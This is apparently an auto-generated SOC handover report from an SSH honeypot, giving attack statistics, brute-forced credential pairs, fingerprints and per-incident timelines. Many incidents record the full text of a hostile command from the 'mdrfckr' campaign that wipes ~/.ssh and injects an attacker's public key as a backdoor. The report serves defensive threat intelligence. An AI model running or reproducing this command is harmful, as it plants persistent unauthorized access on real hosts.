# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-01 |
| **Generated At** | 2026-07-01T12:38:43Z |
| **Shift Time** | 12:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **131** |
| Confirmed Threats | **129** |
| False Positives Filtered | **2** (1.5%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **16** |
| High Severity Cases | **65** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **73** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **18** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **69** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 13 |
| `ubuntu` | 5 |
| `server` | 3 |
| `23` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `server` | 3 |
| `qqqq` | 2 |
| `root` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 6 |
| `server` | `server` | 3 |
| `root` | `qqqq` | 2 |
| `23` | `root` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `cic` | `172.172.131.149` | 2026-07-01T08:56:57 |
| `345gs5662d34` | `345gs5662d34` | `172.172.131.149` | 2026-07-01T08:56:59 |
| `root` | `3245gs5662d34` | `172.172.131.149` | 2026-07-01T08:56:59 |
| `root` | `masukaja` | `167.172.187.11` | 2026-07-01T08:57:41 |
| `345gs5662d34` | `345gs5662d34` | `167.172.187.11` | 2026-07-01T08:57:44 |
| `root` | `3245gs5662d34` | `167.172.187.11` | 2026-07-01T08:57:44 |
| `root` | `qqqq` | `185.242.3.195` | 2026-07-01T08:57:47 |
| `root` | `wanghao123` | `203.19.35.147` | 2026-07-01T08:58:20 |
| `345gs5662d34` | `345gs5662d34` | `203.19.35.147` | 2026-07-01T08:58:24 |
| `root` | `3245gs5662d34` | `203.19.35.147` | 2026-07-01T08:58:25 |
| `root` | `anurag123` | `165.154.227.158` | 2026-07-01T09:00:30 |
| `345gs5662d34` | `345gs5662d34` | `165.154.227.158` | 2026-07-01T09:00:34 |
| `root` | `3245gs5662d34` | `165.154.227.158` | 2026-07-01T09:00:36 |
| `root` | `aA123123` | `10.0.0.73` | 2026-07-01T09:00:56 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-01T09:00:58 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T09:00:58 |
| `root` | `qqqq` | `10.0.0.73` | 2026-07-01T09:01:35 |
| `ubuntu` | `asd` | `45.205.1.42` | 2026-07-01T09:02:12 |
| `debian` | `debian` | `45.198.224.120` | 2026-07-01T09:06:23 |
| `deploy` | `deploy!@#` | `10.0.0.73` | 2026-07-01T09:09:27 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T09:09:30 |
| `calls` | `calls` | `61.28.144.154` | 2026-07-01T09:17:05 |
| `345gs5662d34` | `345gs5662d34` | `61.28.144.154` | 2026-07-01T09:17:09 |
| `calls` | `3245gs5662d34` | `61.28.144.154` | 2026-07-01T09:17:11 |
| `ubuntu` | `progres` | `45.198.224.120` | 2026-07-01T09:17:54 |
| `ubuntu` | `123.com` | `45.205.1.42` | 2026-07-01T09:18:58 |
| `a8` | `a8` | `45.117.177.47` | 2026-07-01T09:20:10 |
| `345gs5662d34` | `345gs5662d34` | `45.117.177.47` | 2026-07-01T09:20:14 |
| `a8` | `3245gs5662d34` | `45.117.177.47` | 2026-07-01T09:20:16 |
| `test99` | `test99` | `190.128.201.18` | 2026-07-01T09:24:00 |
| `345gs5662d34` | `345gs5662d34` | `190.128.201.18` | 2026-07-01T09:24:04 |
| `test99` | `3245gs5662d34` | `190.128.201.18` | 2026-07-01T09:24:05 |
| `root` | `1q2w3e4r5t;` | `111.228.36.44` | 2026-07-01T09:24:11 |
| `alain` | `alain` | `45.198.224.120` | 2026-07-01T09:29:19 |
| `ubuntu` | `Password1` | `45.205.1.42` | 2026-07-01T09:35:41 |
| `root` | `Qwerty123?` | `45.198.224.120` | 2026-07-01T09:40:47 |
| `git` | `g1t` | `150.241.77.28` | 2026-07-01T09:42:38 |
| `345gs5662d34` | `345gs5662d34` | `150.241.77.28` | 2026-07-01T09:42:41 |
| `git` | `3245gs5662d34` | `150.241.77.28` | 2026-07-01T09:42:41 |
| `root` | `Aa12345678!` | `203.185.198.246` | 2026-07-01T09:48:16 |
| `345gs5662d34` | `345gs5662d34` | `203.185.198.246` | 2026-07-01T09:48:27 |
| `root` | `3245gs5662d34` | `203.185.198.246` | 2026-07-01T09:48:31 |
| `root` | `S3cureLinux#Passw0rd!` | `45.198.224.120` | 2026-07-01T09:52:14 |
| `root` | `qwe123QWE` | `45.205.1.42` | 2026-07-01T09:52:23 |
| `server` | `server` | `185.242.3.195` | 2026-07-01T09:52:59 |
| `23` | `root` | `83.168.69.141` | 2026-07-01T09:58:13 |
| `23` | `admin` | `83.168.69.141` | 2026-07-01T09:59:56 |
| `root` | `ashley` | `45.198.224.120` | 2026-07-01T10:03:30 |
| `root` | `qwerty1234` | `45.205.1.42` | 2026-07-01T10:09:19 |
| `root` | `P4sswOrd` | `45.198.224.120` | 2026-07-01T10:14:53 |
| `admin` | `admin` | `106.12.170.135` | 2026-07-01T10:21:34 |
| `root` | `Sudo@Pass!2025` | `45.198.224.120` | 2026-07-01T10:26:18 |
| `tom` | `tom123` | `45.205.1.42` | 2026-07-01T10:26:28 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-01T10:27:45 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-01T10:27:45 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-01T10:27:46 |
| `n` | `n` | `62.133.169.58` | 2026-07-01T10:32:17 |
| `345gs5662d34` | `345gs5662d34` | `62.133.169.58` | 2026-07-01T10:32:20 |
| `n` | `3245gs5662d34` | `62.133.169.58` | 2026-07-01T10:32:21 |
| `server` | `server` | `10.0.0.73` | 2026-07-01T10:33:20 |
| `homologa` | `123456` | `43.165.185.177` | 2026-07-01T10:36:21 |
| `345gs5662d34` | `345gs5662d34` | `43.165.185.177` | 2026-07-01T10:36:24 |
| `homologa` | `3245gs5662d34` | `43.165.185.177` | 2026-07-01T10:36:25 |
| `svn` | `svn` | `45.198.224.120` | 2026-07-01T10:37:37 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-01T10:41:58 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-01T10:41:59 |
| `ubuntu` | `0123456789` | `45.205.1.42` | 2026-07-01T10:43:29 |
| `root` | `Passwrd01!` | `45.198.224.120` | 2026-07-01T10:48:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `45.156.129.127` | 2026-07-01T10:52:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **131** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 35 |
| Go SSH scanner | 22 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `16443846184e...` | Generic scanner | 20 | 3 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 20 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.241.77.28`, `203.185.198.246`, `190.128.201.18`, `62.133.169.58`, `61.28.144.154`, `111.228.36.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **31** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (65)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c5ac2e21c809

| Field | Detail |
|---|---|
| **Source IP** | `172.172.131[.]149` |
| **First Seen** | 2026-07-01 08:56 |
| **Last Seen** | 2026-07-01 08:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:56:57` | `cowrie.session.connect` |
| `2026-07-01 08:56:57` | `cowrie.client.version` |
| `2026-07-01 08:56:57` | `cowrie.client.kex` |
| `2026-07-01 08:56:57` | `cowrie.login.success` |
| `2026-07-01 08:56:57` | `cowrie.session.params` |
| `2026-07-01 08:56:57` | `cowrie.command.input` |
| `2026-07-01 08:56:57` | `cowrie.command.failed` |
| `2026-07-01 08:56:57` | `cowrie.log.closed` |
| `2026-07-01 08:56:58` | `cowrie.session.params` |
| `2026-07-01 08:56:58` | `cowrie.command.input` |
| `2026-07-01 08:56:58` | `cowrie.session.file_download` |
| `2026-07-01 08:56:58` | `cowrie.log.closed` |
| `2026-07-01 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.131[.]149` to AbuseIPDB if not already reported
- [ ] Block `172.172.131[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee8d806e59c

| Field | Detail |
|---|---|
| **Source IP** | `172.172.131[.]149` |
| **First Seen** | 2026-07-01 08:56 |
| **Last Seen** | 2026-07-01 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:56:58` | `cowrie.session.connect` |
| `2026-07-01 08:56:58` | `cowrie.client.version` |
| `2026-07-01 08:56:58` | `cowrie.client.kex` |
| `2026-07-01 08:56:59` | `cowrie.login.success` |
| `2026-07-01 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.131[.]149` to AbuseIPDB if not already reported
- [ ] Block `172.172.131[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e22ddffe057

| Field | Detail |
|---|---|
| **Source IP** | `172.172.131[.]149` |
| **First Seen** | 2026-07-01 08:56 |
| **Last Seen** | 2026-07-01 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:56:59` | `cowrie.session.connect` |
| `2026-07-01 08:56:59` | `cowrie.client.version` |
| `2026-07-01 08:56:59` | `cowrie.client.kex` |
| `2026-07-01 08:56:59` | `cowrie.login.success` |
| `2026-07-01 08:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.131[.]149` to AbuseIPDB if not already reported
- [ ] Block `172.172.131[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b47704d888a

| Field | Detail |
|---|---|
| **Source IP** | `167.172.187[.]11` |
| **First Seen** | 2026-07-01 08:57 |
| **Last Seen** | 2026-07-01 08:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:57:41` | `cowrie.session.connect` |
| `2026-07-01 08:57:41` | `cowrie.client.version` |
| `2026-07-01 08:57:41` | `cowrie.client.kex` |
| `2026-07-01 08:57:41` | `cowrie.login.success` |
| `2026-07-01 08:57:42` | `cowrie.session.params` |
| `2026-07-01 08:57:42` | `cowrie.command.input` |
| `2026-07-01 08:57:42` | `cowrie.command.failed` |
| `2026-07-01 08:57:42` | `cowrie.log.closed` |
| `2026-07-01 08:57:43` | `cowrie.session.params` |
| `2026-07-01 08:57:43` | `cowrie.command.input` |
| `2026-07-01 08:57:43` | `cowrie.session.file_download` |
| `2026-07-01 08:57:43` | `cowrie.log.closed` |
| `2026-07-01 08:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.187[.]11` to AbuseIPDB if not already reported
- [ ] Block `167.172.187[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1f49e60a0f

| Field | Detail |
|---|---|
| **Source IP** | `167.172.187[.]11` |
| **First Seen** | 2026-07-01 08:57 |
| **Last Seen** | 2026-07-01 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:57:43` | `cowrie.session.connect` |
| `2026-07-01 08:57:43` | `cowrie.client.version` |
| `2026-07-01 08:57:43` | `cowrie.client.kex` |
| `2026-07-01 08:57:44` | `cowrie.login.success` |
| `2026-07-01 08:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.187[.]11` to AbuseIPDB if not already reported
- [ ] Block `167.172.187[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e38aa40133

| Field | Detail |
|---|---|
| **Source IP** | `167.172.187[.]11` |
| **First Seen** | 2026-07-01 08:57 |
| **Last Seen** | 2026-07-01 08:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:57:44` | `cowrie.session.connect` |
| `2026-07-01 08:57:44` | `cowrie.client.version` |
| `2026-07-01 08:57:44` | `cowrie.client.kex` |
| `2026-07-01 08:57:44` | `cowrie.login.success` |
| `2026-07-01 08:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.187[.]11` to AbuseIPDB if not already reported
- [ ] Block `167.172.187[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd8f82eed5c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 08:57 |
| **Last Seen** | 2026-07-01 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:57:47` | `cowrie.session.connect` |
| `2026-07-01 08:57:47` | `cowrie.client.version` |
| `2026-07-01 08:57:47` | `cowrie.client.kex` |
| `2026-07-01 08:57:47` | `cowrie.login.success` |
| `2026-07-01 08:57:48` | `cowrie.session.params` |
| `2026-07-01 08:57:48` | `cowrie.command.input` |
| `2026-07-01 08:57:48` | `cowrie.log.closed` |
| `2026-07-01 08:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7833b9fd078

| Field | Detail |
|---|---|
| **Source IP** | `203.19.35[.]147` |
| **First Seen** | 2026-07-01 08:58 |
| **Last Seen** | 2026-07-01 08:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:58:19` | `cowrie.session.connect` |
| `2026-07-01 08:58:19` | `cowrie.client.version` |
| `2026-07-01 08:58:19` | `cowrie.client.kex` |
| `2026-07-01 08:58:20` | `cowrie.login.success` |
| `2026-07-01 08:58:21` | `cowrie.session.params` |
| `2026-07-01 08:58:21` | `cowrie.command.input` |
| `2026-07-01 08:58:21` | `cowrie.command.failed` |
| `2026-07-01 08:58:21` | `cowrie.log.closed` |
| `2026-07-01 08:58:22` | `cowrie.session.params` |
| `2026-07-01 08:58:22` | `cowrie.command.input` |
| `2026-07-01 08:58:22` | `cowrie.session.file_download` |
| `2026-07-01 08:58:22` | `cowrie.log.closed` |
| `2026-07-01 08:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.19.35[.]147` to AbuseIPDB if not already reported
- [ ] Block `203.19.35[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4d38f8926a

| Field | Detail |
|---|---|
| **Source IP** | `203.19.35[.]147` |
| **First Seen** | 2026-07-01 08:58 |
| **Last Seen** | 2026-07-01 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:58:23` | `cowrie.session.connect` |
| `2026-07-01 08:58:23` | `cowrie.client.version` |
| `2026-07-01 08:58:23` | `cowrie.client.kex` |
| `2026-07-01 08:58:24` | `cowrie.login.success` |
| `2026-07-01 08:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.19.35[.]147` to AbuseIPDB if not already reported
- [ ] Block `203.19.35[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069903c9c6ad

| Field | Detail |
|---|---|
| **Source IP** | `203.19.35[.]147` |
| **First Seen** | 2026-07-01 08:58 |
| **Last Seen** | 2026-07-01 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 08:58:24` | `cowrie.session.connect` |
| `2026-07-01 08:58:24` | `cowrie.client.version` |
| `2026-07-01 08:58:24` | `cowrie.client.kex` |
| `2026-07-01 08:58:25` | `cowrie.login.success` |
| `2026-07-01 08:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.19.35[.]147` to AbuseIPDB if not already reported
- [ ] Block `203.19.35[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b6e28e5840

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-01 09:00 |
| **Last Seen** | 2026-07-01 09:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:00:29` | `cowrie.session.connect` |
| `2026-07-01 09:00:29` | `cowrie.client.version` |
| `2026-07-01 09:00:29` | `cowrie.client.kex` |
| `2026-07-01 09:00:30` | `cowrie.login.success` |
| `2026-07-01 09:00:31` | `cowrie.session.params` |
| `2026-07-01 09:00:31` | `cowrie.command.input` |
| `2026-07-01 09:00:31` | `cowrie.command.failed` |
| `2026-07-01 09:00:32` | `cowrie.log.closed` |
| `2026-07-01 09:00:33` | `cowrie.session.params` |
| `2026-07-01 09:00:33` | `cowrie.command.input` |
| `2026-07-01 09:00:33` | `cowrie.session.file_download` |
| `2026-07-01 09:00:33` | `cowrie.log.closed` |
| `2026-07-01 09:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46563aa368b6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-01 09:00 |
| **Last Seen** | 2026-07-01 09:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:00:33` | `cowrie.session.connect` |
| `2026-07-01 09:00:33` | `cowrie.client.version` |
| `2026-07-01 09:00:33` | `cowrie.client.kex` |
| `2026-07-01 09:00:34` | `cowrie.login.success` |
| `2026-07-01 09:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee48a8add3c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-07-01 09:00 |
| **Last Seen** | 2026-07-01 09:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:00:35` | `cowrie.session.connect` |
| `2026-07-01 09:00:35` | `cowrie.client.version` |
| `2026-07-01 09:00:35` | `cowrie.client.kex` |
